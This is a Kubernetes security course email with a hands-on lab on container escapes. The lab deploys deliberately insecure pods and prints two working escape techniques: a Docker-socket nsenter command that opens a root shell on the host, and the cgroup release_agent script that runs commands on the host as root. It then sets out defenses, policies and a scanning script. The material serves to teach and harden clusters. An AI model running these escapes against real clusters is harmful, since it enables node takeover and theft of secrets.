## Day 78: Container Escape - Breaking Out of the Sandbox

### Email Copy

**Subject:** Day 78: Container Escape - When Containers Aren't Contained

THE IDEA:
Run privileged containers and watch them escape to the host. Mount host filesystem,
access Docker socket, exploit capabilities, and break container isolation.

THE SETUP:
Deploy privileged pods, mount /var/run/docker.sock, use hostPath volumes, add
dangerous capabilities, and discover how containers escape their sandbox.

WHAT I LEARNED:
- privileged: true gives full host access
- hostPath mounts expose host filesystem
- Docker socket mount = root on host
- CAP_SYS_ADMIN enables namespace escapes
- hostPID/hostNetwork break isolation
- runAsUser: 0 runs as root

WHY IT MATTERS:
Container escapes cause:
- Full cluster compromise (node takeover)
- Access to all pod secrets
- Ability to modify other containers
- Host system compromise
- Data exfiltration from host

TRY IT:
🧪 Interactive Lab: https://killercoda.com/chadmcrowell/course/kubeskills-daily/day-078

Tomorrow: Supply chain attacks and compromised images.

---
Chad


---

## Killercoda Lab Instructions


## Step 1: Test basic non-privileged container

```bash
# Normal container with restrictions
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: restricted-pod
spec:
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
    securityContext:
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000
      capabilities:
        drop: ["ALL"]
      readOnlyRootFilesystem: true
EOF

kubectl wait --for=condition=Ready pod restricted-pod --timeout=60s

# Try to access host resources (blocked)
kubectl exec restricted-pod -- ls /host 2>&1 || echo "Cannot access host (good!)"
```

## Step 2: Test privileged container

```bash
# Privileged container (dangerous!)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
    securityContext:
      privileged: true  # Full host access!
EOF

kubectl wait --for=condition=Ready pod privileged-pod --timeout=60s

# Can see host devices
kubectl exec privileged-pod -- ls -la /dev | head -20

echo "Privileged container can:"
echo "- Access all host devices"
echo "- Load kernel modules"
echo "- Manipulate host filesystem"
echo "- Compromise entire node"
```

## Step 3: Test hostPath volume mount

```bash
# Mount host filesystem
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pod
spec:
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

kubectl wait --for=condition=Ready pod hostpath-pod --timeout=60s

# Access host filesystem
kubectl exec hostpath-pod -- ls -la /host/etc | head -10
kubectl exec hostpath-pod -- cat /host/etc/hostname

echo "With hostPath:"
echo "- Full read/write to host filesystem"
echo "- Can modify systemd configs"
echo "- Can read host secrets"
echo "- Can create backdoors"
```

## Step 4: Test Docker socket mount

```bash
# Mount Docker socket (extreme danger!)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: docker-socket-pod
spec:
  containers:
  - name: app
    image: docker:latest
    command: ['sleep', '3600']
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
      type: Socket
EOF

kubectl wait --for=condition=Ready pod docker-socket-pod --timeout=60s 2>/dev/null || echo "Docker socket may not be available"

# If Docker is available
echo "With Docker socket access:"
echo "- Can list all containers on node"
echo "- Can execute in any container"
echo "- Can create privileged containers"
echo "- Equivalent to root on host"

# Example attack (don't execute)
cat > /tmp/docker-escape-example.sh << 'EOF'
# From inside container with Docker socket:

# 1. List containers
docker ps

# 2. Create privileged container
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# 3. Now have root shell on host
# 4. Can access everything
EOF

cat /tmp/docker-escape-example.sh
```

## Step 5: Test dangerous capabilities

```bash
# Container with CAP_SYS_ADMIN
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: cap-sys-admin-pod
spec:
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
    securityContext:
      capabilities:
        add: ["SYS_ADMIN"]  # Very dangerous!
EOF

kubectl wait --for=condition=Ready pod cap-sys-admin-pod --timeout=60s

echo "CAP_SYS_ADMIN allows:"
echo "- Mount operations"
echo "- Namespace manipulation"
echo "- Container escape techniques"
echo "- BPF program loading"
```

## Step 6: Test hostPID namespace

```bash
# Share host PID namespace
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostpid-pod
spec:
  hostPID: true
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
EOF

kubectl wait --for=condition=Ready pod hostpid-pod --timeout=60s

# Can see all host processes
kubectl exec hostpid-pod -- ps aux | head -20

echo "With hostPID:"
echo "- See all processes on node"
echo "- Can kill host processes"
echo "- Can read process memory"
echo "- Can access /proc of host processes"
```

## Step 7: Test hostNetwork namespace

```bash
# Share host network namespace
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: hostnetwork-pod
spec:
  hostNetwork: true
  containers:
  - name: app
    image: nicolaka/netshoot
    command: ['sleep', '3600']
EOF

kubectl wait --for=condition=Ready pod hostnetwork-pod --timeout=60s

# Can access host network
kubectl exec hostnetwork-pod -- ip addr show | head -20

echo "With hostNetwork:"
echo "- Bypass NetworkPolicy"
echo "- Access localhost services"
echo "- Sniff network traffic"
echo "- Bind to privileged ports"
```

## Step 8: Test runAsUser: 0 (root)

```bash
# Running as root user
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: root-user-pod
spec:
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
    securityContext:
      runAsUser: 0  # Root!
EOF

kubectl wait --for=condition=Ready pod root-user-pod --timeout=60s

# Check user
kubectl exec root-user-pod -- id

echo "Running as root:"
echo "- Full permissions in container"
echo "- Can install packages"
echo "- Can modify system files"
echo "- Combined with other vectors = escape"
```

## Step 9: Test /proc filesystem access

```bash
# Read sensitive info from /proc
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: proc-reader
spec:
  hostPID: true
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
EOF

kubectl wait --for=condition=Ready pod proc-reader --timeout=60s

# Read environment variables of other processes
echo "Accessing /proc:"
kubectl exec proc-reader -- ls /proc | head -10

# In production, could read secrets from other process environments
echo "Can potentially read:"
echo "- Environment variables of host processes"
echo "- Command line arguments with credentials"
echo "- Memory maps"
```

## Step 10: Test kernel exploitation path

```bash
# Container that could exploit kernel
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: kernel-access-pod
spec:
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
    securityContext:
      privileged: true
  volumes:
  - name: kmsg
    hostPath:
      path: /dev/kmsg
EOF

echo "Kernel access vectors:"
echo "- Privileged container can load modules"
echo "- Can access /dev/kmsg"
echo "- Can exploit kernel vulnerabilities"
echo "- Container breakout via kernel exploit"
```

## Step 11: Test cgroup escape

```bash
# Conceptual: cgroup escape technique
cat > /tmp/cgroup-escape-concept.sh << 'EOF'
#!/bin/bash
# Conceptual container escape via cgroup

# 1. In privileged container
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp

# 2. Create child cgroup
mkdir /tmp/cgrp/x

# 3. Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# 4. Set release_agent to execute on host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 5. Create script to execute
echo '#!/bin/sh' > /cmd
echo 'ps aux > /output' >> /cmd
chmod +x /cmd

# 6. Trigger release_agent (runs on host!)
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Result: Command executed on host as root!
EOF

cat /tmp/cgroup-escape-concept.sh

echo ""
echo "This is a known container escape technique"
echo "Requires privileged container"
echo "Exploits cgroup notify_on_release feature"
```

## Step 12: Test seccomp bypass

```bash
# Container without seccomp
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: no-seccomp-pod
spec:
  securityContext:
    seccompProfile:
      type: Unconfined  # No syscall filtering!
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
EOF

kubectl wait --for=condition=Ready pod no-seccomp-pod --timeout=60s

echo "Without seccomp:"
echo "- No syscall restrictions"
echo "- Can use dangerous syscalls"
echo "- Can exploit kernel vulnerabilities"
echo "- Combined with other vectors = escape"
```

## Step 13: Test AppArmor/SELinux bypass

```bash
# Pod without AppArmor
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: no-apparmor-pod
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: unconfined
spec:
  containers:
  - name: app
    image: ubuntu
    command: ['sleep', '3600']
EOF

echo "Without AppArmor/SELinux:"
echo "- No mandatory access control"
echo "- Can access files normally restricted"
echo "- Weaker security boundary"
```

## Step 14: Defense mechanisms

```bash
cat > /tmp/container-security-defenses.md << 'EOF'
# Container Security Defenses

## Pod Security Standards

### Restricted Profile (Most Secure)
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: secure-namespace
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

### Restricted Pod Requirements
```yaml
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:v1.0
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
      readOnlyRootFilesystem: true
```

## Security Best Practices

### 1. Never Use Privileged Containers
```yaml
# BAD
securityContext:
  privileged: true

# GOOD
securityContext:
  allowPrivilegeEscalation: false
```

### 2. Drop All Capabilities
```yaml
securityContext:
  capabilities:
    drop: ["ALL"]
    add: ["NET_BIND_SERVICE"]  # Only if needed
```

### 3. Run as Non-Root
```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  runAsGroup: 1000
```

### 4. Read-Only Root Filesystem
```yaml
securityContext:
  readOnlyRootFilesystem: true

# Use emptyDir for writable directories
volumes:
- name: tmp
  emptyDir: {}
volumeMounts:
- name: tmp
  mountPath: /tmp
```

### 5. Enable Seccomp
```yaml
securityContext:
  seccompProfile:
    type: RuntimeDefault  # Or custom profile
```

### 6. Use AppArmor/SELinux
```yaml
# AppArmor
metadata:
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: runtime/default

# SELinux
securityContext:
  seLinuxOptions:
    level: "s0:c123,c456"
```

### 7. Avoid hostPath Volumes
```yaml
# BAD
volumes:
- name: host
  hostPath:
    path: /

# GOOD - Use PVC or emptyDir
volumes:
- name: data
  persistentVolumeClaim:
    claimName: app-data
```

### 8. Never Mount Docker Socket
```yaml
# NEVER DO THIS
volumes:
- name: docker-sock
  hostPath:
    path: /var/run/docker.sock
```

### 9. Disable Host Namespaces
```yaml
# Keep defaults (false)
hostPID: false
hostNetwork: false
hostIPC: false
```

### 10. Use Network Policies
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

## Runtime Security

### Falco Rules
```yaml
- rule: Terminal shell in container
  desc: Detect shell spawned in container
  condition: >
    spawned_process and container and
    proc.name in (shell_binaries)
  output: Shell spawned in container
  priority: WARNING

- rule: Write below root
  desc: Detect write below root filesystem
  condition: >
    open_write and container and
    fd.name startswith "/"
  output: Write below root in container
  priority: WARNING
```

### OPA Gatekeeper Policies
```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sPSPPrivilegedContainer
metadata:
  name: restrict-privileged
spec:
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
  parameters: {}
```

## Scanning and Detection

### Image Scanning
```bash
# Scan images before deployment
trivy image myapp:v1.0

# Fail CI/CD on high/critical vulnerabilities
trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:v1.0
```

### Runtime Monitoring
```bash
# Monitor for container escapes
kubectl logs -n falco -l app=falco --tail=100 | grep -i escape

# Audit privileged containers
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.containers[].securityContext.privileged == true)'
```

## Incident Response

If container escape detected:
1. Isolate affected node
2. Drain workloads to other nodes
3. Collect forensics (logs, memory dump)
4. Terminate compromised containers
5. Patch and rebuild images
6. Review security policies
7. Implement additional controls
EOF

cat /tmp/container-security-defenses.md
```

## Step 15: Security scanning

```bash
# Check for insecure pod configurations
cat > /tmp/check-pod-security.sh << 'EOF'
#!/bin/bash
echo "=== Pod Security Scan ==="

echo -e "\n1. Privileged Containers:"
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.privileged == true) | "\(.metadata.namespace)/\(.metadata.name)"'

echo -e "\n2. Root Users:"
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.runAsUser == 0 or .spec.securityContext.runAsUser == 0) | "\(.metadata.namespace)/\(.metadata.name)"'

echo -e "\n3. Host Namespaces:"
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.hostPID == true or .spec.hostNetwork == true or .spec.hostIPC == true) | "\(.metadata.namespace)/\(.metadata.name)"'

echo -e "\n4. hostPath Volumes:"
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.volumes[]?.hostPath != null) | "\(.metadata.namespace)/\(.metadata.name)"'

echo -e "\n5. Dangerous Capabilities:"
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.containers[].securityContext.capabilities.add[]? == "SYS_ADMIN" or .spec.containers[].securityContext.capabilities.add[]? == "NET_ADMIN") | "\(.metadata.namespace)/\(.metadata.name)"'

echo -e "\n6. No Resource Limits:"
kubectl get pods -A -o json | \
  jq -r '.items[] | select(.spec.containers[].resources.limits == null) | "\(.metadata.namespace)/\(.metadata.name)"' | head -10

echo -e "\n7. Security Score Summary:"
TOTAL=$(kubectl get pods -A --no-headers | wc -l)
PRIVILEGED=$(kubectl get pods -A -o json | jq '[.items[] | select(.spec.containers[].securityContext.privileged == true)] | length')
HOST_NS=$(kubectl get pods -A -o json | jq '[.items[] | select(.spec.hostPID == true or .spec.hostNetwork == true)] | length')
ROOT=$(kubectl get pods -A -o json | jq '[.items[] | select(.spec.containers[].securityContext.runAsUser == 0)] | length')

echo "Total Pods: $TOTAL"
echo "Privileged: $PRIVILEGED"
echo "Host Namespace: $HOST_NS"
echo "Running as Root: $ROOT"

if [ $PRIVILEGED -gt 0 ] || [ $HOST_NS -gt 0 ]; then
  echo "CRITICAL: High-risk configurations detected!"
else
  echo "OK: No critical issues found"
fi
EOF

chmod +x /tmp/check-pod-security.sh
/tmp/check-pod-security.sh
```

## Key Observations

✅ **privileged: true** - grants full host access
✅ **hostPath volumes** - expose host filesystem
✅ **Docker socket** - equivalent to root on host
✅ **Capabilities** - CAP_SYS_ADMIN enables escapes
✅ **Host namespaces** - break container isolation
✅ **Running as root** - weakens security boundary

## Production Patterns

**Secure pod template:**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
  labels:
    app: secure-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: myapp:v1.0
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
      readOnlyRootFilesystem: true
    resources:
      requests:
        cpu: "100m"
        memory: "128Mi"
      limits:
        cpu: "500m"
        memory: "512Mi"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: cache
      mountPath: /app/cache
  volumes:
  - name: tmp
    emptyDir: {}
  - name: cache
    emptyDir: {}
```

**Policy enforcement with OPA:**
```rego
# Block privileged containers
package kubernetes.admission

deny[msg] {
  input.request.kind.kind == "Pod"
  input.request.object.spec.containers[_].securityContext.privileged
  msg := "Privileged containers are not allowed"
}

# Require runAsNonRoot
deny[msg] {
  input.request.kind.kind == "Pod"
  not input.request.object.spec.securityContext.runAsNonRoot
  msg := "Containers must run as non-root user"
}

# Block hostPath
deny[msg] {
  input.request.kind.kind == "Pod"
  input.request.object.spec.volumes[_].hostPath
  msg := "hostPath volumes are not allowed"
}
```

## Cleanup

```bash
kubectl delete pod restricted-pod privileged-pod hostpath-pod docker-socket-pod cap-sys-admin-pod hostpid-pod hostnetwork-pod root-user-pod proc-reader no-seccomp-pod no-apparmor-pod 2>/dev/null
rm -f /tmp/*.sh /tmp/*.md
```

---
Next: Day 79 - Supply Chain Attacks and Compromised Images
